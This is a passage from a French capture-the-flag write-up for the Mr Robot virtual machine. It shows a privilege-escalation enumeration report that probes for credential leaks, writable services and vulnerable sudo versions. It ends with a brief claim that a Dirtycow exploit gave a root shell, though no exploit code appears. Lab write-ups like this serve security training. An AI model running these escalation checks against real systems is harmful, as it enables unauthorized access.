+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] ret500 User systemd timers............................................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] ret510 Can we write in any system timer?............................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] ret900 Systemd timers.................................................. skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>================================================================( network )=====
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] net000 Services listening only on localhost............................ yes!
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] net010 Can we sniff traffic with tcpdump?.............................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] net500 NIC and IP information.......................................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] net510 Routing table................................................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] net520 ARP table....................................................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] net530 Nameservers..................................................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] net540 Systemd Nameservers............................................. skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] net550 Listening TCP................................................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] net560 Listening UDP................................................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>===============================================================( services )=====
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] srv000 Can we write in service files?.................................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] srv010 Can we write in binaries executed by services?.................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] srv040 Upstart files not belonging to root............................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] srv400 Contents of /etc/inetd.conf..................................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] srv410 Contents of /etc/xinetd.conf.................................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] srv420 List /etc/xinetd.d if used...................................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] srv430 List /etc/init.d/ permissions................................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] srv440 List /etc/rc.d/init.d permissions............................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] srv450 List /usr/local/etc/rc.d permissions............................ skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] srv460 List /etc/init/ permissions..................................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] srv500 Can we write in systemd service files?.......................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] srv510 Can we write in binaries executed by systemd services?.......... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] srv520 Systemd files not belonging to root............................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] srv900 Systemd config files permissions................................ skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>===============================================================( software )=====
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof010 Can we connect to MySQL as root without password?............... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof015 Are there credentials in mysql_history file?.................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] sof030 Installed apache modules........................................ nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof040 Found any .htpasswd files?...................................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof050 Are there private keys in ssh-agent?............................ nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof070 Can we write to a ssh-agent socket?............................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof080 Can we write to a gpg-agent socket?............................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof090 Found any keepass database files?............................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof100 Found any &#39;</span>pass<span style=color:#e6db74>&#39; store directories?............................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof110 Are there any tmux sessions available?.......................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] sof120 Are there any tmux sessions from other users?................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof130 Can we write to tmux session sockets from other users?.......... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof140 Are any screen sessions available?.............................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] sof150 Are there any screen sessions from other users?................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof160 Can we write to screen session sockets from other users?........ nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] sof170 Can we access MongoDB databases without credentials?............ nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sof180 Can we access any Kerberos credentials?......................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] sof500 Sudo version.................................................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] sof510 MySQL version................................................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] sof520 Postgres version................................................ skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] sof530 Apache version.................................................. skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] sof540 Tmux version.................................................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] sof550 Screen version.................................................. skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>=============================================================( containers )=====
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] ctn000 Are we in a docker container?................................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] ctn010 Is docker available?............................................ nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] ctn020 Is the user a member of the &#39;</span>docker<span style=color:#960050;background-color:#1e0010>&#39;</span> group?..................... nope
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ctn200 Are we in a lxc container?...................................... nope
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> ctn210 Is the user a member of any lxc/lxd group?...................... nope
+</span></span><span style=display:flex><span><span style=color:#f92672>==============================================================(</span> processes <span style=color:#f92672>)=====</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> pro000 Waiting <span style=color:#66d9ef>for</span> the process monitor to finish....................... yes!
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> pro001 Retrieving process binaries..................................... yes!
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> pro002 Retrieving process users........................................ yes!
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> pro010 Can we write in any process binary?............................. nope
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> pro020 Processes running with root permissions......................... yes!
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> pro030 Processes running by non-root users with shell.................. nope
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> pro500 Running processes............................................... skip
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> pro510 Running process binaries and permissions........................ skip
+</span></span><span style=display:flex><span><span style=color:#f92672>===================================================================(</span> CVEs <span style=color:#f92672>)=====</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> cve-2019-5736 Escalate in some types of docker containers.............. nope
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> cve-2021-3156 Sudo Baron Samedit vulnerability......................... yes!
+</span></span><span style=display:flex><span>---
+</span></span><span style=display:flex><span>Vulnerable! sudo version: 1.8.9p5-1ubuntu1.1
+</span></span><span style=display:flex><span>---
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> cve-2021-3560 Checking <span style=color:#66d9ef>for</span> policykit vulnerability..................... nope
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> cve-2021-4034 Checking <span style=color:#66d9ef>for</span> PwnKit vulnerability........................ nope
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> cve-2022-0847 Dirty Pipe vulnerability................................. nope
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> cve-2022-25636 Netfilter linux kernel vulnerability.................... nope
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> cve-2023-22809 Sudoedit bypass in Sudo &lt;<span style=color:#f92672>=</span> 1.9.12p1..................... yes!
+</span></span><span style=display:flex><span>---
+</span></span><span style=display:flex><span>Vulnerable! sudo version: 1.8.9p5-1ubuntu1.1
+</span></span><span style=display:flex><span>---
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>==================================(</span> FINISHED <span style=color:#f92672>)==================================</span>
+</span></span></code></pre></div></div></details><h3 id=dirtycow>Dirtycow
+<a class=anchor href=#dirtycow>#</a></h3><p>L&rsquo;énumération nous montre une faille possible avec dirtycow. On exploite directement la faille et on obtient un shell root pour notre dernier drapeau.</p><p><img src=../img/mrrobot_root.png alt=root></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><div class="flex flex-wrap justify-between"><span><a href=/docs/writeups/vm/ class="flex align-center book-icon"><img src=/svg/backward.svg class=book-icon alt=Previous title="Virtual Machines">
+<span>Virtual Machines</span>
+</a></span><span><a href=/docs/writeups/vm/collapsed/wonderlands/ class="flex align-center book-icon"><span>Wonderlands</span>
+<img src=/svg/forward.svg class=book-icon alt=Next title=Wonderlands></a></span></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#reconnaissance>Reconnaissance</a></li><li><a href=#acces-a-lapplication>Acces a l&rsquo;application</a><ul><li><a href=#robotstxt>robots.txt</a></li><li><a href=#fuzzing--bruteforce>Fuzzing & Bruteforce</a></li></ul></li><li><a href=#shell>Shell</a><ul><li><a href=#wordpress-plugin>Wordpress Plugin</a></li><li><a href=#utilisateur-robot>Utilisateur robot</a></li><li><a href=#hashcat>Hashcat</a></li></ul></li><li><a href=#escalade-de-privilege>Escalade de privilege</a><ul><li><a href=#enumeration-avec-les>Enumeration avec LES</a></li><li><a href=#dirtycow>Dirtycow</a></li></ul></li></ul></nav></div></aside></main></body></html>
